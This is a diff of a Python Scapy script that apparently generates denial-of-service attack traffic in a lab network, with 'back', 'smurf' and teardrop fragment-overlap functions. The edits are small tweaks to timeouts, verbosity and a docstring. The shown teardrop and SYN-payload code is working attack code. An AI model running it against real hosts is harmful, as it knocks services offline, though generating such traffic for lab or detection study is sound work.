@@ -15,7 +15,7 @@ def back(target_ip, payload, target_port=80, src_ip="192.168.147.150"):
     i = IP(src=src_ip, dst=target_ip)
     t = TCP(flags="S", dport=int(target_port), sport=RandShort())
     back_attack = i / t / Raw(payload=payload)
-    replies = sr(back_attack, timeout=2)
+    replies = sr(back_attack, timeout=3)
     for packet in replies:
         print(packet)
 
@@ -72,6 +72,7 @@ def smurf(source_ip, target_ip, packets_send=1000):
 # Code taken from:
 # https://samsclass.info/123/proj10/teardrop.htm
 def teardrop(target, attack, src_ip="192.168.147.153"):
+    """
     print('Attacking target ' + target + ' with attack ' + attack)
     print("   Attack Codes:                                           ")
     print("   0: small payload (36 bytes), 2 packets, offset=3x8 bytes")
@@ -79,6 +80,7 @@ def teardrop(target, attack, src_ip="192.168.147.153"):
     print("   2: large payload (1300 bytes), 12 packets, offset=80x8 bytes")
     print("   3: large payload (1300 bytes), 2 packets, offset=3x8 bytes")
     print("   4: large payload (1300 bytes), 2 packets, offset=10x8 bytes")
+    """
     print("Executing teardrop at: " + str(datetime.now()))
 
     if attack == '0':
@@ -148,12 +150,12 @@ def teardrop(target, attack, src_ip="192.168.147.153"):
         for x in range(1, 10):
             i.frag = offset
             offset = offset + 80
-            send(i / load)
+            send(i / load, verbose=False)
             print("Attack 2 packet " + str(x))
 
         i.frag = offset
         i.flags = 0
-        send(i / load)
+        send(i / load, verbose=False)
 
     elif attack == '3':
         print("Using attack 3")
